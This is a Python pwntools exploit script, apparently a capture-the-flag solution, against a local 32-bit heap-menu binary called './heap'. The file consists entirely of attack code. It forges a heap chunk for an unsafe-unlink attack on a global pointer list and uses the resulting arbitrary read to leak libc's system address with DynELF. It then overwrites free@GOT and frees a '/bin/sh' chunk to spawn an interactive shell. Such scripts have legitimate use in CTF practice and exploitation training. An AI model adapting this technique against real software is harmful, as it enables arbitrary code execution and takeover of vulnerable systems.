#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(os='linux', arch='i386')
# p = remote('127.0.0.1',10001)
p = process("./heap")

chunk_list = 0x8049d60
free_got = 0x8049ce8

flag = 0
def leak(addr):
    data = "A" * 0xc + p32(chunk_list-0xc) + p32(addr)
    global flag
    if flag == 0:
        set_chunk(0, data)
        flag = 1
    else:
        set_chunk2(0, data)
    res = ""
    p.recvuntil('5.Exit\n')
    res = print_chunk(1)
    print("leaking: %#x ---> %s" % (addr, res[0:4].encode('hex')))
    return res[0:4]

def add_chunk(len):
    print p.recvuntil('\n')
    p.sendline('1')
    print p.recvuntil('Input the size of chunk you want to add:')
    p.sendline(str(len))

def set_chunk(index,data):
    p.recvuntil('5.Exit\n')
    p.sendline('2')
    p.recvuntil('Set chunk index:')
    p.sendline(str(index))
    p.recvuntil('Set chunk data:')
    p.sendline(data)

def set_chunk2(index, data):
    p.sendline('2')
    p.recvuntil('Set chunk index:')
    p.sendline(str(index))
    p.recvuntil('Set chunk data:')
    p.sendline(data)

def del_chunk(index):
    p.recvuntil('\n')
    p.sendline('3')
    p.recvuntil('Delete chunk index:')
    p.sendline(str(index))

def print_chunk(index):
    p.sendline('4')
    p.recvuntil('Print chunk index:')
    p.sendline(str(index))
    res = p.recvuntil('5.Exit\n')
    return res


raw_input('add_chunk')
add_chunk(128)  #0
add_chunk(128)  #1
add_chunk(128)  #2
add_chunk(128)  #3
set_chunk(3, '/bin/sh')

#fake_chunk
payload = ""
payload += p32(0) + p32(0x89) + p32(chunk_list-0xc) + p32(chunk_list-0x8)
payload += "A"*(0x80-4*4)
#2nd chunk 
payload += p32(0x80) + p32(0x88)

set_chunk(0,payload)
#get the pointer
del_chunk(1)

set_chunk(0, 'A' * 12 + p32(0x8049d54) + p32(0x8049d14))

raw_input('leak')
#leak system_addr
pwn_elf = ELF('./heap')
d = DynELF(leak, elf=pwn_elf)
sys_addr = d.lookup('system', 'libc')
print("system addr: %#x" % sys_addr)

raw_input('edit free@got')
data = "A" * 12 + p32(chunk_list-0xc) + p32(free_got)
set_chunk2('0', data)

set_chunk2('1', p32(sys_addr))

del_chunk('3')
p.interactive()
p.close()
